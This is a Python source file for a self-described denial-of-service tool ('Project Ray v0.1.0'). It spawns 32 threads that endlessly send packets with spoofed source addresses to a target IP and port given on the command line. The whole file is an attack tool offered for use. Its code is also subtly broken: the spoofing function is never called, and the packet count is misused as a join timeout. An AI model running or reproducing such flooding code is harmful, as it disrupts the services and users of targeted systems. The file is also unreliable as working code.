import sys
import threading
from argparse import ArgumentParser
from utils.ip_utils import generate_private_ip
from utils.packet_attack import send_packet
# Settings
PACKET_COUNT = 1000
max_threads = 32
def start_attack(target_ip, target_port, packet_count):
    print(f"Initializing attack on {target_ip}:{target_port} with {packet_count} pack")

    def attack_thread():
        while True:
            source_ip = generate_private_ip
            try:
                send_packet(target_ip, target_port, source_ip)
                print(f"Sent: {packet_count} to {target_ip} port: {target_port}")
            except Exception as e:
                print(f"Error in thread: {e}")
    threads = []
    for i in range(max_threads):
        thread = threading.Thread(target=attack_thread)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join(packet_count)

if __name__ == "__main__":
    parser = ArgumentParser(description="Distributed Denial-Of-Service Project Ray v0.1.0")
    parser.add_argument("-i", "--ip", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", required=True, type=int, help="Target port")
    parser.add_argument("-c", "--count", type=int, default=PACKET_COUNT, help="Number of packets to send")

    args = parser.parse_args()

    start_attack(args.ip, args.port, args.count)
